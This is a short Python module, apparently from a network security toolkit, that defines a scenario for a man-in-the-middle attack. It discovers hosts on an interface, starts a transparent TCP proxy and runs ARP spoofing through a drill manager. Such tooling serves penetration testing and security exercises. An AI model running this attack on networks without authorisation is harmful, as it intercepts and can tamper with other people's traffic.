"""
Scenario entrypoint for MITM with arp spoofing and transparent tcp proxy.
"""
from nsak.core import DrillManager
from nsak.core.config import LOADED_DEVICE
from nsak.core.network import NetworkDiscoveryResultMap


def run(interface: str) -> None:
    """
    Scenario, which runs MITM attack, based on arp spoofing.

    :return: None
    """
    network_interface = LOADED_DEVICE.get_ethernet(interface)

    network_discovery_result_map: NetworkDiscoveryResultMap = DrillManager.execute(
        "discover_hosts",
        network_interface=network_interface,
    )
    DrillManager.execute(
        "transparent_tcp_proxy",
        network_discovery_result_map=network_discovery_result_map,
    )
    DrillManager.execute(
        "arp_spoof",
        network_discovery_result_map=network_discovery_result_map
    )
